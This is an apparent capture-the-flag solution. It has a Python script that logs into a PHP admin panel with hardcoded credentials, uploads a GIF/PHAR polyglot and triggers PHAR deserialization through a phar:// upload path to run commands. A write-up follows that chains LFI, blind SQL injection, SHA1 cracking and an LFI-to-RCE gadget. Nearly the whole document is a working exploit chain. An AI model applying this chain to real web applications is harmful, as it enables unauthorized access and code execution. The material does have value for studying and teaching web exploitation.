#!/usr/bin/env python3
import requests
import sys
import time
import re

#host = "http://edu.arang.kr:8080"
host = "http://localhost:8080"

def login_admin():
    url = f"{host}/admin/index.php"
    data = {
        'username': 'admin',
        'password': 'admin123'
    }
    s = requests.Session()
    r = s.post(url, data=data)
    if "upload.php" in r.text:
        print("[+] Successfully logged in as admin")
        
        # Extract session directory from the response
        session_dir_match = re.search(r'Your session upload directory: ([a-zA-Z0-9]+)', r.text)
        
        if not session_dir_match:
            # If not found in response, make a request to upload.php to get it
            r = s.get(f"{host}/admin/upload.php")
            session_dir_match = re.search(r'Your session upload directory: ([a-zA-Z0-9]+)', r.text)
        
        if session_dir_match:
            session_dir = session_dir_match.group(1)
            print(f"[+] Session directory: {session_dir}")
            return s, session_dir
        else:
            print("[-] Failed to extract session directory")
            sys.exit(1)
    else:
        print("[-] Failed to login")
        sys.exit(1)

def upload_phar(session, session_dir):
    url = f"{host}/admin/upload.php"
    files = {
        'image': ('b_exploit.gif', open('exploit.gif', 'rb'), 'image/gif'),
    }
    # Use the session directory in the upload path
    upload_path = f'/var/www/html/uploads/{session_dir}/thumbnails'
    data = {
        'upload_dir': upload_path
    }   
    r = session.post(url, files=files, data=data)
    if "Valid image signature detected!" in r.text:
        print(f"[+] Successfully uploaded b_exploit.gif to {upload_path}")
        return upload_path
    else:
        print("[-] Failed to upload file")
        print(r.text)
        sys.exit(1)

def trigger_phar(session, upload_path, cmd):
    url = f"{host}/admin/upload.php?0={cmd}"
    # Trigger phar deserialization through file_exists
    files = {
        'image': ('b_exploit.gif', open('exploit.gif', 'rb'), 'image/gif'),
    }
    # Include the session directory in the phar path
    data = {
        'upload_dir': f'phar://{upload_path}/'
    }
    r = session.post(url, files=files, data=data)
    if "Valid image signature detected!" in r.text:
        print("[+] Triggered phar deserialization")
        print(r.text.split("</style> ")[1].split("\x06")[0])
    else:
        print("[-] Failed to trigger phar deserialization")
        print(r.text)
        sys.exit(1)

def main():
    cmd = "/readflag"
    print("[*] Starting full exploitation chain...")
    
    # Step 1: Login as admin and get session directory
    session, session_dir = login_admin()
    
    # Step 2: Upload phar file to session-specific directory
    upload_path = upload_phar(session, session_dir)
    
    # Step 3: Trigger phar deserialization
    trigger_phar(session, upload_path, cmd)
    
    print("[+] Exploitation completed!")

if __name__ == "__main__":
    main() 


'''
1. Reconnaissance and Access Path Identification
- There's a shell web service, and when scanning its domain with nmap, a hidden internal employee web service exists
- Scanning the internal employee web service with dirsearch identifies endpoints `/admin/`, `/download.php`, `/search.php`
- When accessing /admin/, a login page appears that loads images using /download.php?file=logo.jpg, naturally revealing the file parameter of download.php

2. Server Information Acquisition through LFI
- /download.php implements file downloads using fread or similar
- Using the download service to obtain /search.php code, discover a service that queries the database through hidden parameters. SQL injection exists there
- Use blind SQL injection to extract database info, leak user table information to get admin id/pw
- Admin password is hashed with easily crackable SHA1, enabling admin account acquisition
- Access /admin/ endpoint using acquired admin credentials

3. Malicious File Distribution via File Upload and PHAR Deserialization
- Secure image upload feature exists in /admin/ endpoint (prevents .php, .phar uploads) (uses getimagesize for image validation)
- Upload provides path, revealing possibility for PHAR deserialization attack
- Implements thumbnail creation using getimagesize to get dimensions then file_exists to create reduced size
- Trigger PHAR deserialization in file_exists (user-provided path parameter should naturally flow through)
- During PHAR deserialization attack, attacker uses include class in header.php to trigger LFI2RCE
- Can trigger by setting include path as public variable in constructor and including in destructor

4. Flag Acquisition after RCE
- Execute /readflag binary to read and output flag.txt
- Need privilege separation like typical CTF with setuid bit and seteuid/setruid in readflag.c
'''